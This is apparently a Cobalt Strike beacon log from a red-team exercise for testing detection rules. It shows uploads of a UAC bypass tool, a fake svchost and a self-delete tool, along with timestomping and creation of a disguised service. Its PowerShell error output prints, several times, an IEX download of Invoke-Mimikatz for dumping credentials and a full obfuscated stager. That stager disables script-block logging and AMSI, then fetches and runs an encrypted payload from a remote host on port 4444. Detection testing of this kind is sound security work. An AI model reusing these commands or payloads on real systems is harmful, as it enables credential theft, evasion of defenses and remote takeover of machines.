01/27 10:05:53 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: a; pid: 3964; os: Windows; version: 6.1; beacon arch: x86 (x64)
01/27 10:06:05 [task] 4*************LSA Disver************
01/27 10:06:05 [task] 获取管理员权限
01/27 10:06:05 [task] Tasked beacon to make directory c:\RedTeam\
01/27 10:06:05 [task] cd c:\RedTeam\
01/27 10:06:05 [task] Tasked beacon to upload C:\Users\a\Desktop\ReadTeam\resource\uacbypass64.exe as uacbypass64.exe
01/27 10:06:05 [indicator] file: 743e0bf60cefe43ed7c3af5c0ffd98b9 160256 bytes uacbypass64.exe
01/27 10:06:05 [task] Tasked beacon to execute: c:\RedTeam\uacbypass64.exe 1 notepad.exe
01/27 10:06:05 [task] 执行代码
01/27 10:06:47 [checkin] host called home, sent: 160695 bytes
01/27 10:06:48 [error] could not spawn New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NTDS -Name LsaDbExtPt -Value "c:\temp\lsass_lib.dll", "\\share\lulz\lsass_lib.dll": 2
01/27 10:06:48 [error] could not spawn set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NTDS -Name LsaDbExtPt -Value "c:\temp\lsass_lib.dll", "\\share\lulz\lsass_lib.dll": 2
01/27 10:07:00 [task] 测试 IOAT1098_001 
01/27 10:07:48 [checkin] host called home, sent: 55 bytes
01/27 10:07:48 [output]
received output:
发生系统错误 5。

拒绝访问。



01/27 10:08:38 [task] 4************mshta测试*************
01/27 10:08:38 [task] Tasked beacon to make directory c:\RedTeam\
01/27 10:08:39 [task] cd c:\RedTeam\
01/27 10:08:40 [task] Tasked beacon to upload C:\Users\a\Desktop\ReadTeam\resource\test.doc as test.doc
01/27 10:08:40 [indicator] file: c72788bf68b43645d484bac297d20928 8586 bytes test.doc
01/27 10:08:40 [task] cd c:\RedTeam\
01/27 10:08:40 [task] Tasked beacon to run: test.doc
01/27 10:08:48 [checkin] host called home, sent: 8702 bytes
01/27 10:09:33 [task] 4************白名单绕过*************
01/27 10:09:58 [checkin] host called home, sent: 78 bytes
01/27 10:10:20 [task] 根据操作系统类型，选择不同的方式绕过uac， 会弹出高权限的计算器calc.exe
01/27 10:10:20 [task] Tasked beacon to make directory c:\RedTeam\
01/27 10:10:20 [task] cd c:\RedTeam\
01/27 10:10:20 [task] Tasked beacon to upload C:\Users\a\Desktop\ReadTeam\resource\uacbypass64.exe as uacbypass64.exe
01/27 10:10:20 [indicator] file: 743e0bf60cefe43ed7c3af5c0ffd98b9 160256 bytes uacbypass64.exe
01/27 10:10:20 [task] Tasked beacon to execute: c:\RedTeam\uacbypass64.exe 1 notepad.exe
01/27 10:11:09 [checkin] host called home, sent: 160369 bytes
01/27 10:13:49 [task] 4*************进行vmi启动**********
01/27 10:13:49 [task] 获取管理员权限
01/27 10:13:49 [task] Tasked beacon to make directory c:\RedTeam\
01/27 10:13:49 [task] cd c:\RedTeam\
01/27 10:13:49 [task] Tasked beacon to upload C:\Users\a\Desktop\ReadTeam\resource\uacbypass64.exe as uacbypass64.exe
01/27 10:13:49 [indicator] file: 743e0bf60cefe43ed7c3af5c0ffd98b9 160256 bytes uacbypass64.exe
01/27 10:13:49 [task] Tasked beacon to execute: c:\RedTeam\uacbypass64.exe 1 notepad.exe
01/27 10:13:49 [task] 执行代码
01/27 10:14:09 [checkin] host called home, sent: 161042 bytes
01/27 10:14:10 [output]
received output:
ERROR:
Description = Access denied


01/27 10:14:10 [output]
received output:
ERROR:
Description = Access denied


01/27 10:14:10 [output]
received output:
ERROR:
Description = Access denied


01/27 10:14:15 [task] 4************一键执行代码执行的所有测试用例************
01/27 10:14:15 [task] 通过Powershell下载执行ps脚本，触发 1086_002 & 1086_004 两条规则
01/27 10:14:15 [task] execute bypass UAC With Powershell add -Enc Command
01/27 10:14:15 [task] Rundll32执行js
01/27 10:14:15 [task] rundll32加载未签名模块
01/27 10:14:15 [task] Tasked beacon to make directory c:\RedTeam\
01/27 10:14:15 [task] cd c:\RedTeam\
01/27 10:14:15 [task] Tasked beacon to upload C:\Users\a\Desktop\ReadTeam\resource\redteam.dll as redteam.dll
01/27 10:14:15 [indicator] file: a90a12afb5f15c27ddda6a1d959f46a2 81408 bytes redteam.dll
01/27 10:14:15 [task] Tasked beacon to execute: rundll32 redteam.dll,TestRedTeamFunc
01/27 10:15:10 [checkin] host called home, sent: 86009 bytes
01/27 10:15:40 [output]
received output:
使用“1”个参数调用“DownloadString”时发生异常:“无法连接到远程服务器”
所在位置 行:1 字符: 46
+ IEX (New-Object Net.WebClient).DownloadString <<<< ('https://raw.githubuserco
ntent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/
Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : DotNetMethodException
 
无法将“Invoke-Mimikatz”项识别为 cmdlet、函数、脚本文件或可运行程序的名称。请
检查名称的拼写，如果包括路径，请确保路径正确，然后重试。
所在位置 行:1 字符: 202
+ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.
com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfilt
ration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz <<<<  -DumpCreds
    + CategoryInfo          : ObjectNotFound: (Invoke-Mimikatz:String) [], Com 
   mandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
 


01/27 10:16:40 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">使用“1”个参数调用“DownloadData”时发生异常:“无法连接到远程服务器”_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 1401_x000D__x000A_</S><S S="Error">+ IF($PSVERSIOnTable.PSVersIon.MAjor -GE 3){$GPS=[ref].AssEmBlY.GEtTYpE('System_x000D__x000A_</S><S S="Error">.Management.Automation.Utils')."GetFiE`Ld"('cachedGroupPolicySettings','N'+'onP_x000D__x000A_</S><S S="Error">ublic,Static').GEtVaLUE($nUll);If($GPS['ScriptB'+'lockLogging']){$GPS['ScriptB'_x000D__x000A_</S><S S="Error">+'lockLogging']['EnableScriptB'+'lockLogging']=0;$GPS['ScriptB'+'lockLogging'][_x000D__x000A_</S><S S="Error">'EnableScriptBlockInvocationLogging']=0}ELse{[ScrIPTBLoCk]."GetFIe`ld"('signatu_x000D__x000A_</S><S S="Error">res','N'+'onPublic,Static').SetVALue($nUlL,(New-OBJect CoLlECTiONs.GEnErIC.HAsH_x000D__x000A_</S><S S="Error">Set[STring]))}[ReF].ASseMbly.GETTYPe('System.Management.Automation.AmsiUtils')|_x000D__x000A_</S><S S="Error">?{$_}|%{$_.GEtFiElD('amsiInitFailed','NonPublic,Static').SETVALUe($nULL,$trUE)}_x000D__x000A_</S><S S="Error">;};[SYSteM.NeT.SERvICEPoiNTManagEr]::ExPECT100ContInue=0;$wC=New-ObJecT SyStem._x000D__x000A_</S><S S="Error">NEt.WEbCLIENT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) lik_x000D__x000A_</S><S S="Error">e Gecko';$wc.HEadErS.ADd('User-Agent',$u);$WC.PROXy=[SystEm.NeT.WEbREqUEsT]::DE_x000D__x000A_</S><S S="Error">FaulTWEbProxY;$WC.PROXy.CREDeNTiALs = [SYstEm.NEt.CrEDENtiaLCachE]::DeFAUlTNEtw_x000D__x000A_</S><S S="Error">oRkCREDENTialS;$Script:Proxy = $wc.Proxy;$K=[SystEm.TeXT.EnCODing]::ASCII.GetBy_x000D__x000A_</S><S S="Error">TEs('[e6z2!pbTr75sE(3PHSyX^c{an&lt;F_h@+');$R={$D,$K=$ArGs;$S=0..255;0..255|%{$J=(_x000D__x000A_</S><S S="Error">$J+$S[$_]+$K[$_%$K.CounT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;_x000D__x000A_</S><S S="Error">$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bXOr$S[($S[$I]+$S[$H])%256]}}_x000D__x000A_</S><S S="Error">;$ser='http://192.168.233.139:4444';$t='/news.php';$Wc.HEAdeRs.ADD("Cookie","se_x000D__x000A_</S><S S="Error">ssion=xfw+K3eCYz0EgUgNW18BFYPvbLQ=");$datA=$WC.DoWNlOADDATA &lt;&lt;&lt;&lt; ($SeR+$T);$iv=_x000D__x000A_</S><S S="Error">$dATA[0..3];$data=$dAta[4..$daTa.lEngth];-jOIn[Char[]](&amp; $R $data ($IV+$K))|IEX_x000D__x000A_</S><S S="Error">    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : DotNetMethodException_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S><S S="Error">无法对空数组进行索引。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 1421_x000D__x000A_</S><S S="Error">+ IF($PSVERSIOnTable.PSVersIon.MAjor -GE 3){$GPS=[ref].AssEmBlY.GEtTYpE('System_x000D__x000A_</S><S S="Error">.Management.Automation.Utils')."GetFiE`Ld"('cachedGroupPolicySettings','N'+'onP_x000D__x000A_</S><S S="Error">ublic,Static').GEtVaLUE($nUll);If($GPS['ScriptB'+'lockLogging']){$GPS['ScriptB'_x000D__x000A_</S><S S="Error">+'lockLogging']['EnableScriptB'+'lockLogging']=0;$GPS['ScriptB'+'lockLogging'][_x000D__x000A_</S><S S="Error">'EnableScriptBlockInvocationLogging']=0}ELse{[ScrIPTBLoCk]."GetFIe`ld"('signatu_x000D__x000A_</S><S S="Error">res','N'+'onPublic,Static').SetVALue($nUlL,(New-OBJect CoLlECTiONs.GEnErIC.HAsH_x000D__x000A_</S><S S="Error">Set[STring]))}[ReF].ASseMbly.GETTYPe('System.Management.Automation.AmsiUtils')|_x000D__x000A_</S><S S="Error">?{$_}|%{$_.GEtFiElD('amsiInitFailed','NonPublic,Static').SETVALUe($nULL,$trUE)}_x000D__x000A_</S><S S="Error">;};[SYSteM.NeT.SERvICEPoiNTManagEr]::ExPECT100ContInue=0;$wC=New-ObJecT SyStem._x000D__x000A_</S><S S="Error">NEt.WEbCLIENT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) lik_x000D__x000A_</S><S S="Error">e Gecko';$wc.HEadErS.ADd('User-Agent',$u);$WC.PROXy=[SystEm.NeT.WEbREqUEsT]::DE_x000D__x000A_</S><S S="Error">FaulTWEbProxY;$WC.PROXy.CREDeNTiALs = [SYstEm.NEt.CrEDENtiaLCachE]::DeFAUlTNEtw_x000D__x000A_</S><S S="Error">oRkCREDENTialS;$Script:Proxy = $wc.Proxy;$K=[SystEm.TeXT.EnCODing]::ASCII.GetBy_x000D__x000A_</S><S S="Error">TEs('[e6z2!pbTr75sE(3PHSyX^c{an&lt;F_h@+');$R={$D,$K=$ArGs;$S=0..255;0..255|%{$J=(_x000D__x000A_</S><S S="Error">$J+$S[$_]+$K[$_%$K.CounT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;_x000D__x000A_</S><S S="Error">$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bXOr$S[($S[$I]+$S[$H])%256]}}_x000D__x000A_</S><S S="Error">;$ser='http://192.168.233.139:4444';$t='/news.php';$Wc.HEAdeRs.ADD("Cookie","se_x000D__x000A_</S><S S="Error">ssion=xfw+K3eCYz0EgUgNW18BFYPvbLQ=");$datA=$WC.DoWNlOADDATA($SeR+$T);$iv=$dATA[_x000D__x000A_</S><S S="Error"> &lt;&lt;&lt;&lt; 0..3];$data=$dAta[4..$daTa.lEngth];-jOIn[Char[]](&amp; $R $data ($IV+$K))|IEX_x000D__x000A_</S><S S="Error">    + CategoryInfo          : InvalidOperation: (System.Object[]:Object[]) [], _x000D__x000A_</S><S S="Error">    RuntimeException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : NullArray_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S><S S="Error">无法对空数组进行索引。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 1439_x000D__x000A_</S><S S="Error">+ IF($PSVERSIOnTable.PSVersIon.MAjor -GE 3){$GPS=[ref].AssEmBlY.GEtTYpE('System_x000D__x000A_</S><S S="Error">.Management.Automation.Utils')."GetFiE`Ld"('cachedGroupPolicySettings','N'+'onP_x000D__x000A_</S><S S="Error">ublic,Static').GEtVaLUE($nUll);If($GPS['ScriptB'+'lockLogging']){$GPS['ScriptB'_x000D__x000A_</S><S S="Error">+'lockLogging']['EnableScriptB'+'lockLogging']=0;$GPS['ScriptB'+'lockLogging'][_x000D__x000A_</S><S S="Error">'EnableScriptBlockInvocationLogging']=0}ELse{[ScrIPTBLoCk]."GetFIe`ld"('signatu_x000D__x000A_</S><S S="Error">res','N'+'onPublic,Static').SetVALue($nUlL,(New-OBJect CoLlECTiONs.GEnErIC.HAsH_x000D__x000A_</S><S S="Error">Set[STring]))}[ReF].ASseMbly.GETTYPe('System.Management.Automation.AmsiUtils')|_x000D__x000A_</S><S S="Error">?{$_}|%{$_.GEtFiElD('amsiInitFailed','NonPublic,Static').SETVALUe($nULL,$trUE)}_x000D__x000A_</S><S S="Error">;};[SYSteM.NeT.SERvICEPoiNTManagEr]::ExPECT100ContInue=0;$wC=New-ObJecT SyStem._x000D__x000A_</S><S S="Error">NEt.WEbCLIENT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) lik_x000D__x000A_</S><S S="Error">e Gecko';$wc.HEadErS.ADd('User-Agent',$u);$WC.PROXy=[SystEm.NeT.WEbREqUEsT]::DE_x000D__x000A_</S><S S="Error">FaulTWEbProxY;$WC.PROXy.CREDeNTiALs = [SYstEm.NEt.CrEDENtiaLCachE]::DeFAUlTNEtw_x000D__x000A_</S><S S="Error">oRkCREDENTialS;$Script:Proxy = $wc.Proxy;$K=[SystEm.TeXT.EnCODing]::ASCII.GetBy_x000D__x000A_</S><S S="Error">TEs('[e6z2!pbTr75sE(3PHSyX^c{an&lt;F_h@+');$R={$D,$K=$ArGs;$S=0..255;0..255|%{$J=(_x000D__x000A_</S><S S="Error">$J+$S[$_]+$K[$_%$K.CounT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;_x000D__x000A_</S><S S="Error">$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bXOr$S[($S[$I]+$S[$H])%256]}}_x000D__x000A_</S><S S="Error">;$ser='http://192.168.233.139:4444';$t='/news.php';$Wc.HEAdeRs.ADD("Cookie","se_x000D__x000A_</S><S S="Error">ssion=xfw+K3eCYz0EgUgNW18BFYPvbLQ=");$datA=$WC.DoWNlOADDATA($SeR+$T);$iv=$dATA[_x000D__x000A_</S><S S="Error">0..3];$data=$dAta[ &lt;&lt;&lt;&lt; 4..$daTa.lEngth];-jOIn[Char[]](&amp; $R $data ($IV+$K))|IEX_x000D__x000A_</S><S S="Error">    + CategoryInfo          : InvalidOperation: (System.Object[]:Object[]) [], _x000D__x000A_</S><S S="Error">    RuntimeException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : NullArray_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S><S S="Error">无法将“Q”项识别为 cmdlet、函数、脚本文件或可运行程序的名称。请检查名称的拼写_x000D__x000A_</S><S S="Error">，如果包括路径，请确保路径正确，然后重试。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 2_x000D__x000A_</S><S S="Error">+ Q &lt;&lt;&lt;&lt; _x000D__x000A_</S><S S="Error">    + CategoryInfo          : ObjectNotFound: (Q:String) [], CommandNotFoundEx _x000D__x000A_</S><S S="Error">   ception_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : CommandNotFoundException_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

01/27 10:20:34 [task] 4************mshta测试*************
01/27 10:20:34 [task] Tasked beacon to make directory c:\RedTeam\
01/27 10:20:34 [task] cd c:\RedTeam\
01/27 10:20:34 [task] Tasked beacon to upload C:\Users\a\Desktop\ReadTeam\resource\test.doc as test.doc
01/27 10:20:34 [indicator] file: c72788bf68b43645d484bac297d20928 8586 bytes test.doc
01/27 10:20:34 [task] cd c:\RedTeam\
01/27 10:20:34 [task] Tasked beacon to run: test.doc
01/27 10:20:40 [checkin] host called home, sent: 8702 bytes
01/27 10:21:23 [task] 非系统目录运行svchost
01/27 10:21:23 [task] Tasked beacon to make directory c:\RedTeam\
01/27 10:21:23 [task] cd c:\RedTeam\
01/27 10:21:23 [task] Tasked beacon to upload C:\Users\a\Desktop\ReadTeam\resource\svchost.exe as svchost.exe
01/27 10:21:24 [indicator] file: a5381751f68c2a8419151e1c82773502 169472 bytes svchost.exe
01/27 10:21:24 [task] Tasked beacon to execute: c:\RedTeam\svchost.exe
01/27 10:21:50 [checkin] host called home, sent: 169563 bytes
01/27 10:22:10 [task] 通过sc命令创建服务，此规则会同时触发T1050_002
01/27 10:22:10 [task] cd c:\windows\system32
01/27 10:22:10 [task] Tasked beacon to timestomp netsrv.exe to cmd.exe
01/27 10:22:10 [task] Tasked beacon to run: sc delete netsrv
01/27 10:22:10 [task] Tasked beacon to run: sc create netsrv binPath= "C:\windows\system32\netsrv.exe" start= auto DisplayName= "System Network Service"
01/27 10:22:10 [task] Tasked beacon to run: sc start netsrv
01/27 10:22:42 [task] 4************一键执行所有防御绕过的测试用例************
01/27 10:22:42 [task] Modify Registry with Reg.exe method 1
01/27 10:22:42 [task] Tasked beacon to execute: reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\ExplorerAdvanced /t REG_DWORD /v HideFileExt /d 1 /f
01/27 10:22:42 [task] Modify Registry with Reg.exe Method 2
01/27 10:22:42 [task] 非系统目录运行svchost
01/27 10:22:42 [task] Tasked beacon to make directory c:\RedTeam\
01/27 10:22:43 [task] cd c:\RedTeam\
01/27 10:22:43 [task] Tasked beacon to upload C:\Users\a\Desktop\ReadTeam\resource\svchost.exe as svchost.exe
01/27 10:22:43 [indicator] file: a5381751f68c2a8419151e1c82773502 169472 bytes svchost.exe
01/27 10:22:43 [task] Tasked beacon to execute: c:\RedTeam\svchost.exe
01/27 10:22:43 [task] 适用工具连接127.0.0.1:3389
01/27 10:22:43 [task] Tasked beacon to make directory c:\RedTeam\
01/27 10:22:43 [task] cd c:\RedTeam\
01/27 10:22:43 [task] Tasked beacon to upload C:\Users\a\Desktop\ReadTeam\resource\127PortExchange.exe as 127PortExchange.exe
01/27 10:22:43 [indicator] file: 7038e514a0f0c0edb380a48bd87d375b 77312 bytes 127PortExchange.exe
01/27 10:22:43 [task] Tasked beacon to execute: C:\RedTeam\127PortExchange.exe
01/27 10:22:43 [task] 自删除
01/27 10:22:43 [task] Tasked beacon to make directory c:\RedTeam\
01/27 10:22:43 [task] cd c:\RedTeam\
01/27 10:22:43 [task] Tasked beacon to upload C:\Users\a\Desktop\ReadTeam\resource\SelfDelete.exe as SelfDelete.exe
01/27 10:22:43 [indicator] file: 532de23bac2841e4759b8be2af137738 160256 bytes SelfDelete.exe
01/27 10:22:43 [task] Tasked beacon to execute: C:\redteam\SelfDelete.exe
01/27 10:22:50 [checkin] host called home, sent: 407910 bytes
01/27 10:22:51 [error] could not set file time: 6
01/27 10:22:51 [error] could not upload file: 32
01/27 10:22:51 [output]
received output:
[SC] OpenService 失败 1060:

指定的服务未安装。



01/27 10:22:51 [output]
received output:
[SC] OpenSCManager 失败 5:

拒绝访问。



01/27 10:22:51 [output]
received output:
[SC] StartService: OpenService 失败 1060:

指定的服务未安装。



01/27 10:22:51 [output]
received output:
错误: 拒绝访问。


01/27 10:23:19 [task] 4************一键执行代码执行的所有测试用例************
01/27 10:23:19 [task] 通过Powershell下载执行ps脚本，触发 1086_002 & 1086_004 两条规则
01/27 10:23:19 [task] execute bypass UAC With Powershell add -Enc Command
01/27 10:23:19 [task] Rundll32执行js
01/27 10:23:19 [task] rundll32加载未签名模块
01/27 10:23:19 [task] Tasked beacon to make directory c:\RedTeam\
01/27 10:23:19 [task] cd c:\RedTeam\
01/27 10:23:19 [task] Tasked beacon to upload C:\Users\a\Desktop\ReadTeam\resource\redteam.dll as redteam.dll
01/27 10:23:19 [indicator] file: a90a12afb5f15c27ddda6a1d959f46a2 81408 bytes redteam.dll
01/27 10:23:19 [task] Tasked beacon to execute: rundll32 redteam.dll,TestRedTeamFunc
01/27 10:23:51 [checkin] host called home, sent: 86009 bytes
01/27 10:24:21 [output]
received output:
使用“1”个参数调用“DownloadString”时发生异常:“无法连接到远程服务器”
所在位置 行:1 字符: 46
+ IEX (New-Object Net.WebClient).DownloadString <<<< ('https://raw.githubuserco
ntent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/
Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : DotNetMethodException
 
无法将“Invoke-Mimikatz”项识别为 cmdlet、函数、脚本文件或可运行程序的名称。请
检查名称的拼写，如果包括路径，请确保路径正确，然后重试。
所在位置 行:1 字符: 202
+ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.
com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfilt
ration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz <<<<  -DumpCreds
    + CategoryInfo          : ObjectNotFound: (Invoke-Mimikatz:String) [], Com 
   mandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
 


01/27 10:25:21 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">使用“1”个参数调用“DownloadData”时发生异常:“无法连接到远程服务器”_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 1401_x000D__x000A_</S><S S="Error">+ IF($PSVERSIOnTable.PSVersIon.MAjor -GE 3){$GPS=[ref].AssEmBlY.GEtTYpE('System_x000D__x000A_</S><S S="Error">.Management.Automation.Utils')."GetFiE`Ld"('cachedGroupPolicySettings','N'+'onP_x000D__x000A_</S><S S="Error">ublic,Static').GEtVaLUE($nUll);If($GPS['ScriptB'+'lockLogging']){$GPS['ScriptB'_x000D__x000A_</S><S S="Error">+'lockLogging']['EnableScriptB'+'lockLogging']=0;$GPS['ScriptB'+'lockLogging'][_x000D__x000A_</S><S S="Error">'EnableScriptBlockInvocationLogging']=0}ELse{[ScrIPTBLoCk]."GetFIe`ld"('signatu_x000D__x000A_</S><S S="Error">res','N'+'onPublic,Static').SetVALue($nUlL,(New-OBJect CoLlECTiONs.GEnErIC.HAsH_x000D__x000A_</S><S S="Error">Set[STring]))}[ReF].ASseMbly.GETTYPe('System.Management.Automation.AmsiUtils')|_x000D__x000A_</S><S S="Error">?{$_}|%{$_.GEtFiElD('amsiInitFailed','NonPublic,Static').SETVALUe($nULL,$trUE)}_x000D__x000A_</S><S S="Error">;};[SYSteM.NeT.SERvICEPoiNTManagEr]::ExPECT100ContInue=0;$wC=New-ObJecT SyStem._x000D__x000A_</S><S S="Error">NEt.WEbCLIENT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) lik_x000D__x000A_</S><S S="Error">e Gecko';$wc.HEadErS.ADd('User-Agent',$u);$WC.PROXy=[SystEm.NeT.WEbREqUEsT]::DE_x000D__x000A_</S><S S="Error">FaulTWEbProxY;$WC.PROXy.CREDeNTiALs = [SYstEm.NEt.CrEDENtiaLCachE]::DeFAUlTNEtw_x000D__x000A_</S><S S="Error">oRkCREDENTialS;$Script:Proxy = $wc.Proxy;$K=[SystEm.TeXT.EnCODing]::ASCII.GetBy_x000D__x000A_</S><S S="Error">TEs('[e6z2!pbTr75sE(3PHSyX^c{an&lt;F_h@+');$R={$D,$K=$ArGs;$S=0..255;0..255|%{$J=(_x000D__x000A_</S><S S="Error">$J+$S[$_]+$K[$_%$K.CounT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;_x000D__x000A_</S><S S="Error">$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bXOr$S[($S[$I]+$S[$H])%256]}}_x000D__x000A_</S><S S="Error">;$ser='http://192.168.233.139:4444';$t='/news.php';$Wc.HEAdeRs.ADD("Cookie","se_x000D__x000A_</S><S S="Error">ssion=xfw+K3eCYz0EgUgNW18BFYPvbLQ=");$datA=$WC.DoWNlOADDATA &lt;&lt;&lt;&lt; ($SeR+$T);$iv=_x000D__x000A_</S><S S="Error">$dATA[0..3];$data=$dAta[4..$daTa.lEngth];-jOIn[Char[]](&amp; $R $data ($IV+$K))|IEX_x000D__x000A_</S><S S="Error">    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : DotNetMethodException_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S><S S="Error">无法对空数组进行索引。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 1421_x000D__x000A_</S><S S="Error">+ IF($PSVERSIOnTable.PSVersIon.MAjor -GE 3){$GPS=[ref].AssEmBlY.GEtTYpE('System_x000D__x000A_</S><S S="Error">.Management.Automation.Utils')."GetFiE`Ld"('cachedGroupPolicySettings','N'+'onP_x000D__x000A_</S><S S="Error">ublic,Static').GEtVaLUE($nUll);If($GPS['ScriptB'+'lockLogging']){$GPS['ScriptB'_x000D__x000A_</S><S S="Error">+'lockLogging']['EnableScriptB'+'lockLogging']=0;$GPS['ScriptB'+'lockLogging'][_x000D__x000A_</S><S S="Error">'EnableScriptBlockInvocationLogging']=0}ELse{[ScrIPTBLoCk]."GetFIe`ld"('signatu_x000D__x000A_</S><S S="Error">res','N'+'onPublic,Static').SetVALue($nUlL,(New-OBJect CoLlECTiONs.GEnErIC.HAsH_x000D__x000A_</S><S S="Error">Set[STring]))}[ReF].ASseMbly.GETTYPe('System.Management.Automation.AmsiUtils')|_x000D__x000A_</S><S S="Error">?{$_}|%{$_.GEtFiElD('amsiInitFailed','NonPublic,Static').SETVALUe($nULL,$trUE)}_x000D__x000A_</S><S S="Error">;};[SYSteM.NeT.SERvICEPoiNTManagEr]::ExPECT100ContInue=0;$wC=New-ObJecT SyStem._x000D__x000A_</S><S S="Error">NEt.WEbCLIENT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) lik_x000D__x000A_</S><S S="Error">e Gecko';$wc.HEadErS.ADd('User-Agent',$u);$WC.PROXy=[SystEm.NeT.WEbREqUEsT]::DE_x000D__x000A_</S><S S="Error">FaulTWEbProxY;$WC.PROXy.CREDeNTiALs = [SYstEm.NEt.CrEDENtiaLCachE]::DeFAUlTNEtw_x000D__x000A_</S><S S="Error">oRkCREDENTialS;$Script:Proxy = $wc.Proxy;$K=[SystEm.TeXT.EnCODing]::ASCII.GetBy_x000D__x000A_</S><S S="Error">TEs('[e6z2!pbTr75sE(3PHSyX^c{an&lt;F_h@+');$R={$D,$K=$ArGs;$S=0..255;0..255|%{$J=(_x000D__x000A_</S><S S="Error">$J+$S[$_]+$K[$_%$K.CounT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;_x000D__x000A_</S><S S="Error">$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bXOr$S[($S[$I]+$S[$H])%256]}}_x000D__x000A_</S><S S="Error">;$ser='http://192.168.233.139:4444';$t='/news.php';$Wc.HEAdeRs.ADD("Cookie","se_x000D__x000A_</S><S S="Error">ssion=xfw+K3eCYz0EgUgNW18BFYPvbLQ=");$datA=$WC.DoWNlOADDATA($SeR+$T);$iv=$dATA[_x000D__x000A_</S><S S="Error"> &lt;&lt;&lt;&lt; 0..3];$data=$dAta[4..$daTa.lEngth];-jOIn[Char[]](&amp; $R $data ($IV+$K))|IEX_x000D__x000A_</S><S S="Error">    + CategoryInfo          : InvalidOperation: (System.Object[]:Object[]) [], _x000D__x000A_</S><S S="Error">    RuntimeException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : NullArray_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S><S S="Error">无法对空数组进行索引。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 1439_x000D__x000A_</S><S S="Error">+ IF($PSVERSIOnTable.PSVersIon.MAjor -GE 3){$GPS=[ref].AssEmBlY.GEtTYpE('System_x000D__x000A_</S><S S="Error">.Management.Automation.Utils')."GetFiE`Ld"('cachedGroupPolicySettings','N'+'onP_x000D__x000A_</S><S S="Error">ublic,Static').GEtVaLUE($nUll);If($GPS['ScriptB'+'lockLogging']){$GPS['ScriptB'_x000D__x000A_</S><S S="Error">+'lockLogging']['EnableScriptB'+'lockLogging']=0;$GPS['ScriptB'+'lockLogging'][_x000D__x000A_</S><S S="Error">'EnableScriptBlockInvocationLogging']=0}ELse{[ScrIPTBLoCk]."GetFIe`ld"('signatu_x000D__x000A_</S><S S="Error">res','N'+'onPublic,Static').SetVALue($nUlL,(New-OBJect CoLlECTiONs.GEnErIC.HAsH_x000D__x000A_</S><S S="Error">Set[STring]))}[ReF].ASseMbly.GETTYPe('System.Management.Automation.AmsiUtils')|_x000D__x000A_</S><S S="Error">?{$_}|%{$_.GEtFiElD('amsiInitFailed','NonPublic,Static').SETVALUe($nULL,$trUE)}_x000D__x000A_</S><S 